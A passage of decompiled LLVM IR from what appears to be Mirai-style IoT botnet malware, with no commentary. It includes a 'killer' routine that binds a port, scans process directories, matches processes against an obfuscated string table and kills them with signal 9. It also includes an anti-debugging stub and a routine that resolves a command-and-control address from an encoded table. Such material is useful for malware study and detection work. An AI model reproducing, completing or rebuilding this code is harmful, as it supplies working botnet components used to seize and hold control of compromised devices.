  %v0_e2b4 = load i32, i32* @r7, align 4
  %v1_e2b8 = load i32, i32* @sl, align 4
  %v2_e2b8 = add i32 %v1_e2b8, %v2_e2b0
  store i32 %v2_e2b8, i32* @r0, align 4
  %v2_e2bc = inttoptr i32 %v2_e2b8 to i8*
  %v3_e2bc = call i32 @util_strcpy(i8* %v2_e2bc, i32 %v0_e2b4)
  %v2_e2c4 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e2c8 = load i32, i32* @r5, align 4
  store i32 %v2_e2c4, i32* @r4, align 4
  %v2_e2d4 = inttoptr i32 %v0_e2c8 to i32*
  %v3_e2d4 = call i32 @table_retrieve_val(i32 8, i32* %v2_e2d4)
  %v0_e2dc = load i32, i32* @r4, align 4
  %v1_e2dc = load i32, i32* @sl, align 4
  %v2_e2dc = add i32 %v1_e2dc, %v0_e2dc
  store i32 %v2_e2dc, i32* @r0, align 4
  %v2_e2e0 = inttoptr i32 %v2_e2dc to i8*
  %v3_e2e0 = call i32 @util_strcpy(i8* %v2_e2e0, i32 %v3_e2d4)
  %v2_e2e8 = call i32 @util_strlen(i8* %v3_df30)
  %v1_e2f0 = load i32, i32* @sl, align 4
  %v2_e2f0 = add i32 %v1_e2f0, %v2_e2e8
  store i32 %v2_e2f0, i32* @r0, align 4
  %v2_e2f4 = inttoptr i32 %v2_e2f0 to i8*
  %v3_e2f4 = call i32 @util_strcpy(i8* %v2_e2f4, i32 ptrtoint (i32* @global_var_1a78c.31 to i32))
  %v2_e2fc = call i32 @util_strlen(i8* %v3_df30)
  %v0_e300 = load i32, i32* @r6, align 4
  %v1_e300 = add i32 %v0_e300, 11
  %v1_e304 = load i32, i32* @sl, align 4
  %v2_e304 = add i32 %v1_e304, %v2_e2fc
  store i32 %v2_e304, i32* @r0, align 4
  %v2_e308 = inttoptr i32 %v2_e304 to i8*
  %v3_e308 = call i32 @util_strcpy(i8* %v2_e308, i32 %v1_e300)
  %v3_e318 = call i32 @readlink(i32 %v2_df0c, i32 %v2_defc, i32 4096)
  %v7_e31c = icmp eq i32 %v3_e318, -1
  br i1 %v7_e31c, label %dec_label_pc_e270.loopexit, label %dec_label_pc_e328

dec_label_pc_e328:                                ; preds = %dec_label_pc_e290
  %v2_e328 = call i32 @util_strlen(i8* %v3_df1c)
  store i32 %v2_e328, i32* @r1, align 4
  %v4_e33c = call i32 @util_stristr(i8* %v3_df1c, i32 %v2_e328, i32 %v2_e148.pre-phi)
  %v7_e340 = icmp eq i32 %v4_e33c, -1
  br i1 %v7_e340, label %dec_label_pc_e270.loopexit, label %dec_label_pc_e350

dec_label_pc_e350:                                ; preds = %dec_label_pc_e328
  %v0_e348 = load i32, i32* @r7, align 4
  %v2_e350 = inttoptr i32 %v0_e348 to i8*
  %v3_e350 = call i32 @util_atoi(i8* %v2_e350, i32 10)
  %v2_e358 = call i32 @kill(i32 %v3_e350, i32 9)
  %v0_e35c = load i32, i32* @r8, align 4
  %v1_e360 = inttoptr i32 %v0_e35c to i32*
  %v2_e360 = call i32 @__GI_readdir(i32* %v1_e360)
  store i32 %v2_e360, i32* @r6, align 4
  %v2_e364 = icmp eq i32 %v2_e360, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e364, label %dec_label_pc_e378, label %dec_label_pc_e288

dec_label_pc_e378:                                ; preds = %dec_label_pc_e270.loopexit, %dec_label_pc_e350, %dec_label_pc_e288, %dec_label_pc_e270.preheader
  %v0_e378 = load i32, i32* @r8, align 4
  %v1_e37c = inttoptr i32 %v0_e378 to i32*
  %v2_e37c = call i32 @__GI_closedir(i32* %v1_e37c)
  %v0_e380 = load i32, i32* @sb, align 4
  %v1_e384 = inttoptr i32 %v0_e380 to i32*
  %v2_e384 = call i32 @__GI_readdir(i32* %v1_e384)
  %v2_e388 = icmp eq i32 %v2_e384, 0
  br i1 %v2_e388, label %dec_label_pc_e390, label %dec_label_pc_e18c

dec_label_pc_e390:                                ; preds = %dec_label_pc_e17c.loopexit, %dec_label_pc_e378, %dec_label_pc_e18c, %dec_label_pc_e17c.preheader
  %v0_e390 = load i32, i32* @sb, align 4
  %v1_e394 = inttoptr i32 %v0_e390 to i32*
  %v2_e394 = call i32 @__GI_closedir(i32* %v1_e394)
  %v0_e398 = load i32, i32* @r5, align 4
  %v1_e398 = urem i32 %v0_e398, 256
  br label %dec_label_pc_e39c

dec_label_pc_e39c:                                ; preds = %dec_label_pc_e15c, %dec_label_pc_e390
  %storemerge = phi i32 [ %v1_e398, %dec_label_pc_e390 ], [ 0, %dec_label_pc_e15c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_e3a0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_e3a8

dec_label_pc_e3a8:                                ; preds = %dec_label_pc_e13c, %dec_label_pc_e39c
  %v1_e3a8 = call i32 @table_lock_val(i32 6)
  %v1_e3b0 = call i32 @table_lock_val(i32 7)
  %v1_e3b8 = call i32 @table_lock_val(i32 8)
  %v1_e3c0 = call i32 @table_lock_val(i32 9)
  %v0_e3c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e3c4

dec_label_pc_e3c4:                                ; preds = %bb, %dec_label_pc_e3a8
  %v0_e3c4 = phi i32 [ %v1_df9c, %bb ], [ %v0_e3c4.pre, %dec_label_pc_e3a8 ]
  store i32 %v3_deb4, i32* @r4, align 4
  store i32 %v6_deb4, i32* @r5, align 4
  store i32 %v9_deb4, i32* @r6, align 4
  store i32 %v12_deb4, i32* @r7, align 4
  store i32 %v15_deb4, i32* @r8, align 4
  store i32 %v18_deb4, i32* @sb, align 4
  store i32 %v21_deb4, i32* @sl, align 4
  store i32 %v24_deb4, i32* @fp, align 4
  store i32 %v27_deb4, i32* @lr, align 4
  ret i32 %v0_e3c4

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e0ac
  %v1_e3d8 = add i32 %v0_e3d8, 1
  %v7_e3dc = icmp eq i32 %v0_e3d8, 0
  br i1 %v7_e3dc, label %dec_label_pc_e3e4, label %dec_label_pc_e0b4

dec_label_pc_e3e4:                                ; preds = %dec_label_pc_e3d8
  %v1_e3e4 = add i32 %v0_e0bc, 3
  %v2_e3e4 = inttoptr i32 %v1_e3e4 to i8*
  %v3_e3e4 = load i8, i8* %v2_e3e4, align 1
  %v7_e3e8 = icmp eq i8 %v3_e3e4, 65
  br i1 %v7_e3e8, label %dec_label_pc_e3fc, label %dec_label_pc_e3f0

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3e4, %dec_label_pc_e3fc
  %v0_e0c483 = phi i32 [ %v0_e0c484, %dec_label_pc_e3e4 ], [ 1, %dec_label_pc_e3fc ]
  br label %dec_label_pc_e08c.backedge

dec_label_pc_e08c.backedge:                       ; preds = %dec_label_pc_e3f0, %dec_label_pc_e0b8
  %v0_e0c482 = phi i32 [ %v0_e0c483, %dec_label_pc_e3f0 ], [ %v0_e0c484, %dec_label_pc_e0b8 ]
  %v0_e3d874 = phi i32 [ %v1_e3d8, %dec_label_pc_e3f0 ], [ %v0_e0b8, %dec_label_pc_e0b8 ]
  %v0_e0ac.pr71 = phi i32 [ 0, %dec_label_pc_e3f0 ], [ %v0_e0ac.pr72, %dec_label_pc_e0b8 ]
  %v0_e08c = add i32 %v0_e0bc, 1
  %v1_e08c = add i32 %v0_e0bc, 3
  %v2_e08c = inttoptr i32 %v1_e08c to i8*
  %v3_e08c = load i8, i8* %v2_e08c, align 1
  %v4_e08c = zext i8 %v3_e08c to i32
  store i32 %v4_e08c, i32* @r3, align 4
  %v2_e090 = icmp eq i8 %v3_e08c, 0
  %v1_e094 = add i32 %v0_e09479, 1
  br i1 %v2_e090, label %dec_label_pc_e0c4, label %dec_label_pc_e09c

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3e4
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_e3f0

dec_label_pc_e404:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_df60

; uselistorder directives
  uselistorder i32 %v1_e094, { 1, 0 }
  uselistorder i32 %v4_e08c, { 1, 0 }
  uselistorder i32 %v0_e0c482, { 1, 0 }
  uselistorder i32 %v1_e3d8, { 1, 0 }
  uselistorder i32 %v2_e384, { 1, 0 }
  uselistorder i32 %v1_e0f0, { 1, 0 }
  uselistorder i32 %v0_e0fc30, { 1, 0 }
  uselistorder i32 %v1_e114, { 0, 3, 1, 2 }
  uselistorder i32 %v0_e0b8, { 1, 0 }
  uselistorder i32 %v0_e09479, { 1, 0 }
  uselistorder i32 %v0_e3d8, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_e0c484, { 1, 2, 0 }
  uselistorder i32 %v1_e09455, { 1, 0 }
  uselistorder i32 %v2_e078, { 1, 0 }
  uselistorder i32 %v1_e074, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_e034, { 0, 2, 1 }
  uselistorder i32 %v0_e03416, { 1, 0 }
  uselistorder i32 %v1_e000, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_df90, { 1, 2, 0 }
  uselistorder i32 %v0_df38, { 1, 0 }
  uselistorder i32 %v2_df34, { 1, 0, 2 }
  uselistorder i8* %v3_df1c, { 1, 0, 2 }
  uselistorder i32 %v2_defc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_e3f0, { 1, 0 }
  uselistorder label %dec_label_pc_e3c4, { 1, 0 }
  uselistorder label %dec_label_pc_e3a8, { 1, 0 }
  uselistorder label %dec_label_pc_e39c, { 1, 0 }
  uselistorder label %dec_label_pc_e390, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e378, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e288, { 1, 0 }
  uselistorder label %dec_label_pc_e288thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e270.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e18c, { 1, 0 }
  uselistorder label %dec_label_pc_e18c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e17c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e110, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e0b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e09c, { 1, 0 }
  uselistorder label %dec_label_pc_e040, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_dfa4.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_dff4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_dfbc, { 1, 0 }
  uselistorder label %dec_label_pc_df60, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-632 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v3_e430 = load i32, i32* @r4, align 4
  %v6_e430 = load i32, i32* @r5, align 4
  %v9_e430 = load i32, i32* @r6, align 4
  %v12_e430 = load i32, i32* @r7, align 4
  %v15_e430 = load i32, i32* @r8, align 4
  %v18_e430 = load i32, i32* @sb, align 4
  %v21_e430 = load i32, i32* @sl, align 4
  %v24_e430 = load i32, i32* @fp, align 4
  %v2_e43c = call i32 @__GI_time(i32* null)
  store i32 %v2_e43c, i32* @r5, align 4
  %v0_e444 = call i32 @__libc_fork()
  %v7_e448 = icmp eq i32 %v0_e444, -1
  %. = zext i1 %v7_e448 to i32
  %tmp69 = icmp slt i32 %v0_e444, 1
  %storemerge50 = select i1 %tmp69, i32 %., i32 1
  store i32 %storemerge50, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_235f0.102 to i32), i32* %r3.global-to-local, align 4
  %v2_e464 = icmp eq i32 %storemerge50, 0
  store i32 %v0_e444, i32* @global_var_235f0.102, align 4
  br i1 %v2_e464, label %dec_label_pc_e47c, label %dec_label_pc_e470

dec_label_pc_e470:                                ; preds = %dec_label_pc_e4cc, %entry
  %v1_e478 = phi i32 [ %v0_e444, %entry ], [ 0, %dec_label_pc_e4cc ]
  store i32 %v3_e430, i32* @r4, align 4
  store i32 %v6_e430, i32* @r5, align 4
  store i32 %v9_e430, i32* @r6, align 4
  store i32 %v12_e430, i32* @r7, align 4
  store i32 %v15_e430, i32* @r8, align 4
  store i32 %v18_e430, i32* @sb, align 4
  store i32 %v21_e430, i32* @sl, align 4
  store i32 %v24_e430, i32* @fp, align 4
  ret i32 %v1_e478

dec_label_pc_e47c:                                ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v1_e490 = call i32 @killer_kill_by_port(i32 20736)
  %v2_e494 = icmp eq i32 %v1_e490, 0
  br i1 %v2_e494, label %dec_label_pc_e49c, label %dec_label_pc_e6f8

dec_label_pc_e49c:                                ; preds = %dec_label_pc_e47c, %dec_label_pc_e6f8, %dec_label_pc_e720
  %v1_e4a0 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_e4a8 = call i32 @malloc()
  %v1_e4a8 = inttoptr i32 %v0_e4a8 to i8*
  store i32 %v0_e4a8, i32* @global_var_26110.106, align 4
  store i32 ptrtoint (i32* @global_var_235f4.108 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_e4a8, align 1
  %v0_e4c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_e4c0 = inttoptr i32 %v1_e4c0 to i32*
  store i32 %v0_e4c0, i32* %v2_e4c0, align 4
  %v0_e4c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e4c4, i32* @fp, align 4
  store i32 400, i32* @r6, align 4
  %v2_e5c0 = ptrtoint i32* %stack_var_-120 to i32
  %v2_e5cc = bitcast i32* %stack_var_-120 to i8*
  %v2_e62c = ptrtoint i32* %stack_var_-632 to i32
  br label %dec_label_pc_e4cc

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e58c, %dec_label_pc_e49c
  %v1_e4d0 = call i32 @table_unlock_val(i32 6)
  %v3_e4dc = call i32 @table_retrieve_val(i32 6, i32* null)
  %v1_e4e0 = call i32 @__GI_opendir(i32 %v3_e4dc)
  store i32 %v1_e4e0, i32* @sl, align 4
  %v2_e4e4 = icmp eq i32 %v1_e4e0, 0
  br i1 %v2_e4e4, label %dec_label_pc_e470, label %dec_label_pc_e4ec

dec_label_pc_e4ec:                                ; preds = %dec_label_pc_e4cc
  %v1_e4f0 = call i32 @table_lock_val(i32 6)
  %v0_e4f431 = load i32, i32* @sl, align 4
  %v1_e4f832 = inttoptr i32 %v0_e4f431 to i32*
  %v2_e4f833 = call i32 @__GI_readdir(i32* %v1_e4f832)
  %v2_e4fc35 = icmp eq i32 %v2_e4f833, 0
  br i1 %v2_e4fc35, label %dec_label_pc_e58c, label %dec_label_pc_e504.preheader

dec_label_pc_e504.preheader:                      ; preds = %dec_label_pc_e4ec, %dec_label_pc_e4f4.backedge
  %v0_e50440 = phi i32 [ %v2_e4f8, %dec_label_pc_e4f4.backedge ], [ %v2_e4f833, %dec_label_pc_e4ec ]
  br label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e504.preheader, %dec_label_pc_e574
  %v0_e514 = phi i32 [ %v0_e50440, %dec_label_pc_e504.preheader ], [ %v2_e580, %dec_label_pc_e574 ]
  %v1_e504 = add i32 %v0_e514, 11
  %v2_e504 = inttoptr i32 %v1_e504 to i8*
  %v3_e504 = load i8, i8* %v2_e504, align 1
  %v4_e504 = zext i8 %v3_e504 to i32
  %v1_e508 = add nsw i32 %v4_e504, -48
  store i32 %v1_e508, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_e508, 9
  br i1 %tmp, label %dec_label_pc_e4f4.backedge, label %dec_label_pc_e514

dec_label_pc_e514:                                ; preds = %dec_label_pc_e504
  store i32 %v1_e504, i32* @r4, align 4
  %v3_e520 = call i32 @util_atoi(i8* %v2_e504, i32 10)
  %v0_e524 = load i32, i32* @r6, align 4
  store i32 %v3_e520, i32* @r8, align 4
  %v0_e52c = load i32, i32* @fp, align 4
  %v1_e52c = add i32 %v0_e52c, 1
  store i32 %v1_e52c, i32* @fp, align 4
  %v5_e530 = icmp slt i32 %v0_e524, %v3_e520
  %v2_e59c = call i32 @__GI_time(i32* null)
  br i1 %v5_e530, label %dec_label_pc_e598, label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %dec_label_pc_e514
  %v0_e53c = load i32, i32* @r5, align 4
  %v2_e53c = sub i32 %v2_e59c, %v0_e53c
  %v7_e544 = icmp slt i32 %v2_e53c, 601
  br i1 %v7_e544, label %dec_label_pc_e54c, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e534
  store i32 400, i32* @r6, align 4
  br label %dec_label_pc_e4f4.backedge

dec_label_pc_e54c:                                ; preds = %dec_label_pc_e534
  %v0_e54c = load i32, i32* @r8, align 4
  %v7_e550 = icmp slt i32 %v0_e54c, 401
  br i1 %v7_e550, label %dec_label_pc_e4f4.backedge, label %dec_label_pc_e554

dec_label_pc_e554:                                ; preds = %dec_label_pc_e54c
  %v2_e558 = load i32, i32* @fp, align 4
  %v3_e558 = zext i32 %v2_e558 to i64
  %v4_e558 = mul nuw i64 %v3_e558, 3435973837
  %v3_e55c1 = udiv i64 %v4_e558, 34359738368
  %v3_e5603 = mul nuw nsw i64 %v3_e55c1, 8
  %v3_e560 = trunc i64 %v3_e5603 to i32
  store i32 %v3_e560, i32* %r3.global-to-local, align 4
  %v2_e5645 = mul nuw nsw i64 %v3_e55c1, 2
  %v2_e564 = trunc i64 %v2_e5645 to i32
  %v2_e568 = add i32 %v3_e560, %v2_e564
  store i32 %v2_e568, i32* %r2.global-to-local, align 4
  %v9_e56c = icmp eq i32 %v2_e558, %v2_e568
  br i1 %v9_e56c, label %dec_label_pc_e574, label %dec_label_pc_e4f4.backedge

dec_label_pc_e574:                                ; preds = %dec_label_pc_e554
  %v1_e578 = call i32 @sleep(i32 1)
  %v0_e57c = load i32, i32* @sl, align 4
  %v1_e580 = inttoptr i32 %v0_e57c to i32*
  %v2_e580 = call i32 @__GI_readdir(i32* %v1_e580)
  %v2_e584 = icmp eq i32 %v2_e580, 0
  br i1 %v2_e584, label %dec_label_pc_e58c, label %dec_label_pc_e504

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e4f4.backedge, %dec_label_pc_e574, %dec_label_pc_e4ec
  %v0_e58c = load i32, i32* @sl, align 4
  %v1_e590 = inttoptr i32 %v0_e58c to i32*
  %v2_e590 = call i32 @__GI_closedir(i32* %v1_e590)
  br label %dec_label_pc_e4cc

dec_label_pc_e598:                                ; preds = %dec_label_pc_e514
  %v1_e5a8 = call i32 @table_unlock_val(i32 6)
  %v1_e5b0 = call i32 @table_unlock_val(i32 10)
  %v3_e5bc = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_e5c0, i32* @sb, align 4
  store i32 %v2_e5c0, i32* @r0, align 4
  %v3_e5cc = call i32 @util_strcpy(i8* %v2_e5cc, i32 %v3_e5bc)
  %v1_e5d0 = load i32, i32* @sb, align 4
  %v2_e5d0 = add i32 %v1_e5d0, %v3_e5cc
  store i32 %v2_e5d0, i32* @r5, align 4
  %v0_e5d4 = load i32, i32* @r4, align 4
  store i32 %v2_e5d0, i32* @r0, align 4
  %v2_e5dc = inttoptr i32 %v2_e5d0 to i8*
  %v3_e5dc = call i32 @util_strcpy(i8* %v2_e5dc, i32 %v0_e5d4)
  store i32 %v3_e5dc, i32* @r4, align 4
  %v3_e5ec = call i32 @table_retrieve_val(i32 10, i32* null)
  %v0_e5f4 = load i32, i32* @r4, align 4
  %v1_e5f4 = load i32, i32* @r5, align 4
  %v2_e5f4 = add i32 %v1_e5f4, %v0_e5f4
  store i32 %v2_e5f4, i32* @r0, align 4
  %v2_e5f8 = inttoptr i32 %v2_e5f4 to i8*
  %v3_e5f8 = call i32 @util_strcpy(i8* %v2_e5f8, i32 %v3_e5ec)
  %v1_e600 = call i32 @table_lock_val(i32 6)
  %v1_e608 = call i32 @table_lock_val(i32 10)
  %v2_e614 = call i32 @__libc_open(i32 %v2_e5c0, i32 0)
  %v7_e618 = icmp eq i32 %v2_e614, -1
  store i32 %v2_e614, i32* @r7, align 4
  br i1 %v7_e618, label %dec_label_pc_e6c4, label %dec_label_pc_e624

dec_label_pc_e624:                                ; preds = %dec_label_pc_e598
  %v1_e628 = call i32 @table_unlock_val(i32 62)
  store i32 %v2_e62c, i32* @r6, align 4
  %v0_e63027 = load i32, i32* @r7, align 4
  store i32 %v2_e62c, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v1_e63c28 = call i32 @__libc_read(i32 %v0_e63027)
  store i32 %v1_e63c28, i32* @r4, align 4
  %tmp72 = icmp slt i32 %v1_e63c28, 1
  br i1 %tmp72, label %dec_label_pc_e6e4, label %dec_label_pc_e648

dec_label_pc_e648:                                ; preds = %dec_label_pc_e624, %dec_label_pc_e630.backedge
  %v3_e650 = call i32 @table_retrieve_val(i32 62, i32* null)
  store i32 %v3_e650, i32* @r5, align 4
  %v3_e660 = call i32 @table_retrieve_val(i32 62, i32* null)
  %v1_e664 = inttoptr i32 %v3_e660 to i8*
  %v2_e664 = call i32 @util_strlen(i8* %v1_e664)
  %v0_e668 = load i32, i32* @r4, align 4
  %v5_e66c = icmp slt i32 %v0_e668, %v2_e664
  br i1 %v5_e66c, label %dec_label_pc_e630.backedge, label %.thread12

dec_label_pc_e630.backedge:                       ; preds = %dec_label_pc_e694, %.thread12, %dec_label_pc_e648
  %v0_e630 = load i32, i32* @r7, align 4
  store i32 %v2_e62c, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v1_e63c = call i32 @__libc_read(i32 %v0_e630)
  store i32 %v1_e63c, i32* @r4, align 4
  %tmp73 = icmp slt i32 %v1_e63c, 1
  br i1 %tmp73, label %dec_label_pc_e6e4, label %dec_label_pc_e648

.thread12:                                        ; preds = %dec_label_pc_e648
  %v1_e67819 = add i32 %v0_e668, -1
  store i32 %v1_e67819, i32* @r4, align 4
  %v2_e67820 = icmp eq i32 %v0_e668, 0
  br i1 %v2_e67820, label %dec_label_pc_e630.backedge, label %dec_label_pc_e680.lr.ph

dec_label_pc_e680.lr.ph:                          ; preds = %.thread12
  %v0_e680.pre = load i32, i32* @r5, align 4
  %v1_e684.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e680

dec_label_pc_e680:                                ; preds = %dec_label_pc_e694, %dec_label_pc_e680.lr.ph
  %v0_e678 = phi i32 [ %v1_e67819, %dec_label_pc_e680.lr.ph ], [ %v1_e678, %dec_label_pc_e694 ]
  %v0_e694 = phi i32 [ 0, %dec_label_pc_e680.lr.ph ], [ %v1_e694, %dec_label_pc_e694 ]
  %v1_e680 = phi i32 [ 0, %dec_label_pc_e680.lr.ph ], [ %v1_e68043, %dec_label_pc_e694 ]
  %v2_e680 = add i32 %v1_e680, %v0_e680.pre
  %v3_e680 = inttoptr i32 %v2_e680 to i8*
  %v4_e680 = load i8, i8* %v3_e680, align 1
  %v6_e680 = zext i8 %v4_e680 to i32
  store i32 %v6_e680, i32* %r2.global-to-local, align 4
  %v2_e684 = add i32 %v0_e694, %v1_e684.pre
  %v3_e684 = inttoptr i32 %v2_e684 to i8*
  %v4_e684 = load i8, i8* %v3_e684, align 1
  %v6_e684 = zext i8 %v4_e684 to i32
  store i32 %v6_e684, i32* @r3, align 4
  %v9_e688 = icmp eq i8 %v4_e684, %v4_e680
  br i1 %v9_e688, label %dec_label_pc_e69c, label %bb74

bb74:                                             ; preds = %dec_label_pc_e680
  br label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %bb74, %dec_label_pc_e69c
  %v1_e68043 = phi i32 [ %v1_e69c, %dec_label_pc_e69c ], [ 0, %bb74 ]
  %v1_e694 = add i32 %v0_e694, 1
  %v1_e678 = add i32 %v0_e678, -1
  store i32 %v1_e678, i32* @r4, align 4
  %v2_e678 = icmp eq i32 %v0_e678, 0
  br i1 %v2_e678, label %dec_label_pc_e630.backedge, label %dec_label_pc_e680

dec_label_pc_e69c:                                ; preds = %dec_label_pc_e680
  %v1_e69c = add i32 %v1_e680, 1
  %v9_e6a0 = icmp eq i32 %v2_e664, %v1_e69c
  br i1 %v9_e6a0, label %dec_label_pc_e6a8, label %dec_label_pc_e694

dec_label_pc_e6a8:                                ; preds = %dec_label_pc_e69c
  %v1_e6ac = call i32 @table_lock_val(i32 62)
  %v0_e6b0 = load i32, i32* @r7, align 4
  %v1_e6b4 = call i32 @__GI___libc_close(i32 %v0_e6b0)
  %v0_e6b8 = load i32, i32* @r8, align 4
  %v2_e6c0 = call i32 @kill(i32 %v0_e6b8, i32 9)
  br label %dec_label_pc_e6c4

dec_label_pc_e6c4:                                ; preds = %dec_label_pc_e598, %dec_label_pc_e6e4, %dec_label_pc_e6a8
  %v2_e6cc = call i32 @util_zero(i32 %v2_e5c0, i32 64)
  %v1_e6d4 = call i32 @sleep(i32 1)
  store i32 %v2_e59c, i32* @r5, align 4
  %v0_e6dc = load i32, i32* @r8, align 4
  store i32 %v0_e6dc, i32* @r6, align 4
  br label %dec_label_pc_e4f4.backedge

dec_label_pc_e4f4.backedge:                       ; preds = %dec_label_pc_e554, %dec_label_pc_e54c, %dec_label_pc_e504, %dec_label_pc_e6c4, %.thread7
  %v0_e4f4 = load i32, i32* @sl, align 4
  %v1_e4f8 = inttoptr i32 %v0_e4f4 to i32*
  %v2_e4f8 = call i32 @__GI_readdir(i32* %v1_e4f8)
  %v2_e4fc = icmp eq i32 %v2_e4f8, 0
  br i1 %v2_e4fc, label %dec_label_pc_e58c, label %dec_label_pc_e504.preheader

dec_label_pc_e6e4:                                ; preds = %dec_label_pc_e630.backedge, %dec_label_pc_e624
  %v1_e6e8 = call i32 @table_lock_val(i32 62)
  %v0_e6ec = load i32, i32* @r7, align 4
  %v1_e6f0 = call i32 @__GI___libc_close(i32 %v0_e6ec)
  br label %dec_label_pc_e6c4

dec_label_pc_e6f8:                                ; preds = %dec_label_pc_e47c
  %v2_e480 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_e480, i32* %r3.global-to-local, align 4
  %v0_e700 = load i32, i32* @r4, align 4
  store i32 %v0_e700, i32* %r2.global-to-local, align 4
  %v3_e710 = call i32 @socket(i32 2, i32 1, i32 %v0_e700)
  %v7_e714 = icmp eq i32 %v3_e710, -1
  store i32 %v3_e710, i32* @r4, align 4
  br i1 %v7_e714, label %dec_label_pc_e49c, label %dec_label_pc_e720

dec_label_pc_e720:                                ; preds = %dec_label_pc_e6f8
  %v2_e720 = ptrtoint i32* %stack_var_-56 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e728 = call i32 @bind(i32 %v3_e710, i32 %v2_e720, i32 16)
  %v0_e72c = load i32, i32* @r4, align 4
  %v2_e734 = call i32 @listen(i32 %v0_e72c, i32 1)
  br label %dec_label_pc_e49c

; uselistorder directives
  uselistorder i32 %v3_e710, { 2, 1, 0 }
  uselistorder i32 %v2_e4f8, { 1, 0 }
  uselistorder i32 %v1_e69c, { 1, 0 }
  uselistorder i32 %v1_e678, { 1, 0 }
  uselistorder i32 %v1_e680, { 1, 0 }
  uselistorder i32 %v0_e694, { 1, 0 }
  uselistorder i32 %v0_e678, { 1, 0 }
  uselistorder i32 %v0_e668, { 1, 0, 2 }
  uselistorder i32 %v2_e664, { 1, 0 }
  uselistorder i32 %v2_e614, { 1, 0 }
  uselistorder i32 %v2_e580, { 1, 0 }
  uselistorder i32 %v2_e62c, { 1, 0, 2 }
  uselistorder i32 %storemerge50, { 1, 0 }
  uselistorder i32 %v0_e444, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32* @global_var_235f0.102, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e4f4.backedge, { 3, 0, 1, 4, 2 }
  uselistorder label %dec_label_pc_e6c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e694, { 1, 0 }
  uselistorder label %dec_label_pc_e648, { 1, 0 }
  uselistorder label %dec_label_pc_e504, { 1, 0 }
  uselistorder label %dec_label_pc_e504.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e49c, { 2, 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_e764.111 to i32), i32* @global_var_2347c.113, align 4
  ret i32 %arg1
}

define i32 @resolve_cnc_addr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_e76c = call i32 @table_unlock_val(i32 2)
  store i32 ptrtoint (i16** @global_var_26114.115 to i32), i32* @r4, align 4
  store i32 -1378207815, i32* @global_var_26118.117, align 4
  %v3_e784 = call i32 @table_retrieve_val(i32 2, i32* null)
  %v4_e784 = inttoptr i32 %v3_e784 to i16*
  %v3_e788 = load i16, i16* %v4_e784, align 2
  store i16 %v3_e788, i16* bitcast (i32* @global_var_26116.118 to i16*), align 4
  %v1_e794 = call i32 @table_lock_val(i32 2)
  ret i32 %v1_e794
}

